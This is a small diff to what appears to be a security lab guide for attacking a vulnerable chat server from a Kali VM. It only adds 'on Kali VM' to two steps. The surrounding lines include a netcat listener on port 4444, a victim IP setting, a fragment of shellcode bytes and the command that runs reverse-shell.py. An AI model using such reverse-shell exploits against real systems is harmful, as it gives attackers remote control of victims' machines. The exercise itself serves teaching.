@@ -282,7 +282,7 @@ Here are steps:
 nc -l -v -p 4444
 ``` 
 
-3. Change the following lines in reverse-shell.py
+3. Change the following lines in reverse-shell.py on Kali VM
 - Change the victim IP to your Windows VM's IP
 ```
 HOST = '10.0.2.7'   # vitcim IP
@@ -330,7 +330,7 @@ SHELL += b"\x27\xd1\x8d\x88\x22\x9d\x09\x61\x5f\x8e\xff\x85"
 SHELL += b"\xcc\xaf\xd5"
 ```
 
-4. Save reverse-shell.py and run the following command in the folder of /home/kali/GenCyber/vchat/Attack/ within another terminal
+4. Save reverse-shell.py and run the following command in the folder of /home/kali/GenCyber/vchat/Attack/ within another terminal on Kali VM
 ```
 python reverse-shell.py
 ```  
